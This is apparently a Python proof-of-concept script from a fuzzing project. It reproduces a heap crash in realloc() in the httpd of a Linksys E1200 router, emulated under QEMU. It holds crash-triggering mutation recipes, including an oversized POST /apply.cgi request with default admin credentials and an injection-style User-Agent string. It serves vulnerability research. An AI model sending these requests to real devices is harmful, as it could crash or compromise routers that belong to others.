#!/usr/bin/env python3
"""
poc_e1200_heap.py — PoC for NB-E1200-01

Crash: SIGSEGV in realloc() when httpd processes POST /apply.cgi with
inflated Content-Length. Requires mixed-FD mutations (network + file).

NB-E1200-01 (7ed84369):
  Signal: SIGSEGV  PC: 0x2b4980c8 (realloc+0x218), 2876 campaign hits
  Trigger: http_extend+http_request at idx=138 (POST body inflate)
           + dictionary_multi at idx=136
           + file_fd_retval at idx=151/156/160 (mixed-FD trigger)

NB-E1200-01 (a5b07455):
  Signal: SIGSEGV  PC: 0x2b498000 (realloc+0x150), 81 campaign hits
  Trigger: http_extend+http_request at idx=138 (POST body inflate)
           + file_fd_retval at idx=115/130/133/156 (mixed-FD trigger)

Both require mixed-FD mutations — classified PROBABLY-EXPLOITABLE.

Trace: tests/seeds/Linksys_E1200_post.trace (171 syscalls, re-recorded 2026-04-10)
  accept@65(GET), accept@104(POST), read(fd=7)@136(256B headers), read(fd=7)@138(116B body)
  fork_point=104

Usage:
  cd rr_fuzzing/fuzzing
  python3 ../tests/scripts/fuzzing/poc_e1200_heap.py [--variant 7ed84369|a5b07455] [--max-rounds N] [--gdb]

GDB (with --gdb):
  gdb-multiarch tests/verified_targets/Linksys_E1200/rootfs/usr/sbin/httpd
  (gdb) set architecture mips
  (gdb) target remote :9998
  (gdb) continue
"""
import sys, argparse
from pathlib import Path

ROOT = Path(__file__).resolve().parents[3]
sys.path.insert(0, str(ROOT / 'fuzzing'))

from conductor.qemu_executor import QEMUExecutor
from conductor.conductor_types import FuzzInstruction

ROOTFS     = str(ROOT / 'tests/verified_targets/Linksys_E1200/rootfs')
BUILD      = str(ROOT / '../../build')
BINARY     = f'{ROOTFS}/usr/sbin/httpd'
TRACE      = str(ROOT / 'tests/seeds/Linksys_E1200_post.trace')
FORK_POINT = 104
GDB_PORT   = 9998

# NB-E1200-01 (7ed84369): SIGSEGV at 0x2b4980c8 (realloc+0x218)
# Recipe from crash_w0_002661_7ed84369 (e1200_post3 campaign)
# Network: http_extend+http_request inject oversized POST body
# Mixed: file_fd_retval at idx=151/156/160 essential for heap state corruption
MUTATIONS_7ED84369 = [
    FuzzInstruction(syscall_index=136, cmd=2, arg_index=1,
                    data=b'VersEkleContr', offset=0, size=13,
                    mutation_type='dictionary_multi'),
    FuzzInstruction(syscall_index=138, cmd=8, arg_index=1,
                    data=b'\x00\x04\x00\x00', offset=0, size=4,
                    mutation_type='http_extend'),
    FuzzInstruction(syscall_index=138, cmd=5, arg_index=1,
                    data=(b'POST /apply.cgi HTTP/1.1\r\n'
                          b'Host: 127.0.0.1\r\n'
                          b'Authorization: Basic YWRtaW46YWRtaW4=\r\n\r\n'),
                    offset=0, size=84, mutation_type='http_request'),
    FuzzInstruction(syscall_index=139, cmd=5, arg_index=1,
                    data=b'\x03\x00\x00\x00', offset=0, size=4,
                    mutation_type='aux_buffer'),
    FuzzInstruction(syscall_index=147, cmd=8, arg_index=1,
                    data=b'\x04\x00\x00\x00', offset=0, size=4,
                    mutation_type='extend'),
    FuzzInstruction(syscall_index=152, cmd=11, arg_index=1,
                    data=b'\x04\x04', offset=0, size=2,
                    mutation_type='overwrite_offset'),
    # File-FD mutations (mixed trigger)
    FuzzInstruction(syscall_index=151, cmd=1, arg_index=255,
                    data=b'\xf5\xff\xff\xff\xff\xff\xff\xff', offset=0, size=8,
                    mutation_type='file_fd_retval'),
    FuzzInstruction(syscall_index=156, cmd=1, arg_index=255,
                    data=b'\xf5\xff\xff\xff\xff\xff\xff\xff', offset=0, size=8,
                    mutation_type='file_fd_retval'),
    FuzzInstruction(syscall_index=160, cmd=1, arg_index=255,
                    data=b'\x04\x00\x00\x00\x00\x00\x00\x00', offset=0, size=8,
                    mutation_type='file_fd_retval'),
]

# NB-E1200-01 (a5b07455): SIGSEGV at 0x2b498000 (realloc+0x150)
# Recipe from crash_w0_002681_a5b07455 (e1200_post3 campaign)
# Network: http_extend+http_request inject oversized POST body
# Mixed: file_fd_retval at idx=115/130/133/156 essential for heap state corruption
MUTATIONS_A5B07455 = [
    FuzzInstruction(syscall_index=128, cmd=8, arg_index=1,
                    data=b'\x04\x00\x00\x00', offset=0, size=4,
                    mutation_type='extend'),
    FuzzInstruction(syscall_index=138, cmd=8, arg_index=1,
                    data=b'\x00\x04\x00\x00', offset=0, size=4,
                    mutation_type='http_extend'),
    FuzzInstruction(syscall_index=138, cmd=5, arg_index=1,
                    data=(b"POST /apply.cgi HTTP/1.1\r\n"
                          b"Host: 127.0.0.1\r\n"
                          b"Authorization: Basic YWRtaW46YWRtaW4=\r\n"
                          b"User-Agent: ' OR '1'='1\r\n\r\n"),
                    offset=0, size=109, mutation_type='http_request'),
    FuzzInstruction(syscall_index=141, cmd=6, arg_index=1,
                    data=b'\x05\x00\x00\x00', offset=0, size=4,
                    mutation_type='bitflip'),
    FuzzInstruction(syscall_index=153, cmd=9, arg_index=1,
                    data=b'\xff\xff\x00\x00\x00\x00\x00\x00', offset=0, size=8,
                    mutation_type='interesting_value'),
    # File-FD mutations (mixed trigger)
    FuzzInstruction(syscall_index=115, cmd=1, arg_index=255,
                    data=b'\x00\x00\x00\x00\x00\x00\x00\x00', offset=0, size=8,
                    mutation_type='file_fd_retval'),
    FuzzInstruction(syscall_index=130, cmd=1, arg_index=255,
                    data=b'\x04\x00\x00\x00\x00\x00\x00\x00', offset=0, size=8,
                    mutation_type='file_fd_retval'),
    FuzzInstruction(syscall_index=133, cmd=1, arg_index=255,
                    data=b'\xf3\xff\xff\xff\xff\xff\xff\xff', offset=0, size=8,
                    mutation_type='file_fd_retval'),
    FuzzInstruction(syscall_index=156, cmd=1, arg_index=255,
                    data=b'\xf5\xff\xff\xff\xff\xff\xff\xff', offset=0, size=8,
                    mutation_type='file_fd_retval'),
]

VARIANTS = {
    '7ed84369': (MUTATIONS_7ED84369, 0x2b4980c8, 'NB-E1200-01 (realloc+0x218)'),
    'a5b07455': (MUTATIONS_A5B07455, 0x2b498000, 'NB-E1200-01 (realloc+0x150)'),
}


def run_poc(max_rounds: int, gdb_mode: bool, target_hash: str):
    mutations, expected_pc, label = VARIANTS[target_hash]
    extra_args = ['-g', str(GDB_PORT)] if gdb_mode else []

    if gdb_mode:
        print(f'\nConnect GDB:')
        print(f'  gdb-multiarch {BINARY}')
        print(f'  (gdb) set architecture mips')
        print(f'  (gdb) target remote :{GDB_PORT}')
        print(f'  (gdb) continue\n')

    executor = QEMUExecutor(
        qemu_path=f'{BUILD}/qemu-mipsel',
        target_binary=BINARY,
        ld_prefix=ROOTFS,
        timeout=15.0,
        extra_qemu_args=extra_args,
    )

    file_fd_count = sum(1 for m in mutations if m.mutation_type == 'file_fd_retval')
    print(f'[*] {label} PoC ({target_hash})')
    print(f'[*] Target  : {BINARY}')
    print(f'[*] Trace   : {TRACE}')
    print(f'[*] fork_point: {FORK_POINT}')
    print(f'[*] Expected PC: {hex(expected_pc)}')
    print(f'[*] Mutations: {len(mutations)} ({file_fd_count} file_fd_retval — mixed-FD trigger)')
    print()

    found = False
    for rnd in range(1, max_rounds + 1):
        results = executor.execute_fork(
            trace_file=TRACE,
            fork_point=FORK_POINT,
            mutation_variants=[mutations],
            depth=0,
            iteration_id=rnd,
        )

        if not results:
            if rnd % 50 == 0:
                print(f'  round {rnd:4d}: no result')
            continue

        r = results[0]
        crashed = getattr(r, 'crashed', False)
        sig     = getattr(r, 'signal_number', None)
        pc      = hex(getattr(r, 'pc', 0) or 0)

        if crashed:
            print(f'  round {rnd:4d}: *** CRASH ***  pc={pc}  signal={sig}')
            found = True
            break
        elif rnd % 50 == 0:
            print(f'  round {rnd:4d}: {getattr(r, "status_name", "ok")}')

    executor.stop_persistent_qemu()

    print()
    if found:
        print(f'★ {label} CONFIRMED: pc={pc}  signal={sig}')
        print(f'  realloc heap overflow — mixed-FD trigger (network+file)')
    else:
        print(f'✗ Not reproduced in {max_rounds} rounds')
        print(f'  Note: heap corruption requires specific heap state; try more rounds.')
    return found


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('--max-rounds', type=int, default=200)
    ap.add_argument('--gdb',        action='store_true')
    ap.add_argument('--variant',    default='7ed84369',
                    choices=list(VARIANTS.keys()))
    args = ap.parse_args()

    run_poc(args.max_rounds, args.gdb, args.variant)


if __name__ == '__main__':
    main()
